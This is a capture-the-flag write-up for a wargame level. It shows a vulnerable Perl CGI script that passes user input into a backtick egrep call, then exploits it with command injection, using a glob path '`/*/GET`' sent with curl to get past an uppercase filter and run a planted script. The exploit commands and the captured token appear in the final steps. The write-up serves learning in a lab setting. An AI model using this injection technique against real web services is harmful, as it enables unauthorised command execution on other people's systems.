# level08 solve

To begin, when we get logged and trying to see if we got the file we can see we have one file ` level12.pl `

```
$ ls
> level12.pl
```

As level04, it's a <a href="https://fr.wikipedia.org/wiki/Perl_(langage)">Perl</a> file, so we decide to check what he contain.

```
$ cat level12.pl  
```
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

With that we can see 4 important elements :

```
- localhost:4646 -> url, so we can try to call the website with curl

- n(t(param("x"), param("y"))); -> parameters who can contain a value

- $xx = $_[0];			|	  First parameter (x) will be transform
  $xx =~ tr/a-z/A-Z/;	| ->  to uppercase and 
  $xx =~ s/\s.*//;		|	  remove spaces

- @output = `egrep "^$xx" /tmp/xd 2>&1`; -> will be breakable with a code injection cause of ` character
```

According to elements, we should make an injection using an uppercase file (read permisssion) who write ```getflag``` return value on another file

```
$ echo "getflag > /tmp/flag" > /tmp/GET
$ chmod 777 /tmp/GET
```

Ok let's do this

```
$ curl 127.0.0.1:4646?x='`/*/GET`'
> ..
$ cat /tmp/flag
> Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

We got it!

> <a href="../flag">flag</a> - <a href="../../level11">previous level</a> - <a href="../../level13">next level</a>
